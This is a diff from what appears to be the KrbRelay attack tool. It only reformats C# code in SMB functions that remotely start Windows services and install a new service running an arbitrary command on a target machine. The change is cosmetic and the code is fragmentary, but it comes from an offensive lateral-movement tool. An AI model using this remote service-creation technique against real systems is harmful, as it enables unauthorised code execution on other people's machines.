@@ -10,7 +10,14 @@ namespace KrbRelay.Clients.Attacks.Smb
     {
         public static bool startService(SMB2Client smbClient, string serviceName, out bool serviceWasStopped, out bool serviceWasDisabled)
         {
-            using (RPCCallHelper rpc = new RPCCallHelper(smbClient, ScmrService.ServicePipeName, ScmrService.ServiceInterfaceGuid, ScmrService.ServiceVersion))
+            using (
+                RPCCallHelper rpc = new RPCCallHelper(
+                    smbClient,
+                    ScmrService.ServicePipeName,
+                    ScmrService.ServiceInterfaceGuid,
+                    ScmrService.ServiceVersion
+                )
+            )
             {
                 serviceWasDisabled = false;
                 serviceWasStopped = false;
@@ -28,7 +35,12 @@ namespace KrbRelay.Clients.Attacks.Smb
                     Console.WriteLine("[-] Could open SCMR handle");
                     return false;
                 }
-                var serviceHandle = ScmrServiceHelper.rOpenServiceW(rpc, lpScHandle, serviceName, out status);
+                var serviceHandle = ScmrServiceHelper.rOpenServiceW(
+                    rpc,
+                    lpScHandle,
+                    serviceName,
+                    out status
+                );
                 if (status != NTStatus.STATUS_SUCCESS)
                 {
                     ScmrServiceHelper.rCloseServiceHandle(rpc, lpScHandle, out var temp);
@@ -124,7 +136,14 @@ namespace KrbRelay.Clients.Attacks.Smb
 
         public static void serviceInstall(SMB2Client smb2, string serviceName, string cmd)
         {
-            using (RPCCallHelper rpc = new RPCCallHelper(smb2, ScmrService.ServicePipeName, ScmrService.ServiceInterfaceGuid, ScmrService.ServiceVersion))
+            using (
+                RPCCallHelper rpc = new RPCCallHelper(
+                    smb2,
+                    ScmrService.ServicePipeName,
+                    ScmrService.ServiceInterfaceGuid,
+                    ScmrService.ServiceVersion
+                )
+            )
             {
                 var status = rpc.BindPipe();
                 if (status != NTStatus.STATUS_SUCCESS)
@@ -138,7 +157,13 @@ namespace KrbRelay.Clients.Attacks.Smb
                     Console.WriteLine("[-] Failed to open SCMR handle: {0}", status);
                     return;
                 }
-                var newHandle = ScmrServiceHelper.rCreateServiceW(rpc, lpScHandle, $"{serviceName}\x00", cmd, out status);
+                var newHandle = ScmrServiceHelper.rCreateServiceW(
+                    rpc,
+                    lpScHandle,
+                    $"{serviceName}\x00",
+                    cmd,
+                    out status
+                );
                 if (status != NTStatus.STATUS_SUCCESS)
                 {
                     Console.WriteLine("[-] Failed to create service: {0}", status);
